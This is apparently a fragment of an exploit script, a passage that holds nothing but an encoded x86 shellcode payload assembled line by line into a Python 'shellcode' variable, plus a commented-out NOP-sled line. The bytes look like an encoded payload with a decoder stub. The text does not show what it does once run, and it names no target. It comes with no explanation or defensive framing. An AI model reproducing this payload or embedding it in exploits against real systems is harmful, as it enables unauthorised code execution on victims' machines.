...
#shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90" # add nops for extra bytes in updated payload

shellcode += "\x33\xc9\x83\xe9\xa5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\x1b\xf0\x48\x85\x83\xee\xfc\xe2\xf4\xe7\x18"
shellcode += "\xca\x85\x1b\xf0\x28\x0c\xfe\xc1\x88\xe1\x90\xa0\x78"
shellcode += "\x0e\x49\xfc\xc3\xd7\x0f\x7b\x3a\xad\x14\x47\x02\xa3"
shellcode += "\x2a\x0f\xe4\xb9\x7a\x8c\x4a\xa9\x3b\x31\x87\x88\x1a"
shellcode += "\x37\xaa\x77\x49\xa7\xc3\xd7\x0b\x7b\x02\xb9\x90\xbc"
shellcode += "\x59\xfd\xf8\xb8\x49\x54\x4a\x7b\x11\xa5\x1a\x23\xc3"
shellcode += "\xcc\x03\x13\x72\xcc\x90\xc4\xc3\x84\xcd\xc1\xb7\x29"
shellcode += "\xda\x3f\x45\x84\xdc\xc8\xa8\xf0\xed\xf3\x35\x7d\x20"
shellcode += "\x8d\x6c\xf0\xff\xa8\xc3\xdd\x3f\xf1\x9b\xe3\x90\xfc"
shellcode += "\x03\x0e\x43\xec\x49\x56\x90\xf4\xc3\x84\xcb\x79\x0c"
shellcode += "\xa1\x3f\xab\x13\xe4\x42\xaa\x19\x7a\xfb\xaf\x17\xdf"
shellcode += "\x90\xe2\xa3\x08\x46\x98\x7b\xb7\x1b\xf0\x20\xf2\x68"
shellcode += "\xc2\x17\xd1\x73\xbc\x3f\xa3\x1c\x79\xa0\x7a\xcb\x48"
shellcode += "\xd8\x84\x1b\xf0\x61\x41\x4f\xa0\x20\xac\x9b\x9b\x48"
shellcode += "\x7a\xce\x9a\x42\xed\x11\xfa\x46\x83\x73\xf2\x48\x9a"
shellcode += "\x8b\x79\xae\xd5\x4b\xa0\x18\xc5\x4b\xb0\x18\xed\xf1"
shellcode += "\xff\x97\x65\xe4\x25\xdf\xef\x0b\xa6\x1f\xed\x82\x55"
shellcode += "\x3c\xe4\xe4\x25\xcd\x45\x6f\xfa\xb7\xcb\x13\x85\xa4"
shellcode += "\x6d\x7c\xf0\x48\x85\x71\xf0\x22\x81\x4d\xa7\x20\x87"
shellcode += "\xc2\x38\x17\x7a\xce\x73\xb0\x85\x65\xc6\xc3\xb3\x71"
shellcode += "\xb0\x20\x85\x0b\xf0\x48\xd3\x71\xf0\x20\xdd\xbf\xa3"
shellcode += "\xad\x7a\xce\x63\x1b\xef\x1b\xa6\x1b\xd2\x73\xf2\x91"
shellcode += "\x4d\x44\x0f\x9d\x06\xe3\xf0\x35\xad\x43\x98\x48\xc5"
shellcode += "\x1b\xf0\x22\x85\x4b\x98\x43\xaa\x14\xc0\xb7\x50\x4c"
shellcode += "\x98\x3d\xeb\x56\x91\xb7\x50\x45\xae\xb7\x89\x3f\xff"
shellcode += "\xcd\xf5\xe4\x0f\xb7\x6c\x80\x0f\xb7\x7a\x1a\x33\x61"
shellcode += "\x43\x6e\x31\x8b\x3e\xfb\xed\x62\x8f\x73\x56\xdd\x38"
shellcode += "\x86\x0f\x9d\xb9\x1d\x8c\x42\x05\xe0\x10\x3d\x80\xa0"
shellcode += "\xb7\x5b\xf7\x74\x9a\x48\xd6\xe4\x25\x48\x85"
